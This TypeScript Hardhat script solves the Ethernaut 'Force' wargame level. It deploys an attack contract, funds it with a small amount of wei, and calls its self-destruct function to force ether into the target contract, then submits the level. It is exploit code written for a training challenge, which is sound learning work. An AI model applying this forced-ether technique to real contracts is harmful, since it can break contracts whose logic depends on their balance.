import { Signer } from 'ethers'
import { ethers } from 'hardhat'
import { ForceAttack } from '../typechain-types'
import { loadOrCreateLevelInstance, submitLevelInstance } from './ethernaut'
import { loadOrDeployContract } from './helpers'

const levelAddress = '0x22699e6AdD7159C3C385bf4d7e1C647ddB3a99ea'

const main = async () => {
  const signer = (await ethers.getSigners())[0] as Signer

  const targetContract = await loadOrCreateLevelInstance('Force', levelAddress, signer)
  const attackContract = (await loadOrDeployContract('ForceAttack', [targetContract.address], signer)) as ForceAttack

  console.log('Target contract balance: ', await ethers.provider.getBalance(targetContract.address))

  const sendEtherTx = await signer.sendTransaction({ to: attackContract.address, value: 100, gasLimit: 100000 })
  console.log('Send ether tx id: ', sendEtherTx.hash)
  await sendEtherTx.wait()

  const destructTx = await attackContract.boom()
  console.log('Boom tx id: ', destructTx.hash)
  await destructTx.wait()

  console.log('Target contract balance: ', await ethers.provider.getBalance(targetContract.address))

  await submitLevelInstance(targetContract.address, signer)
}

main()
  .then(() => process.exit())
  .catch(e => {
    console.error(e)
    process.exit(1)
  })
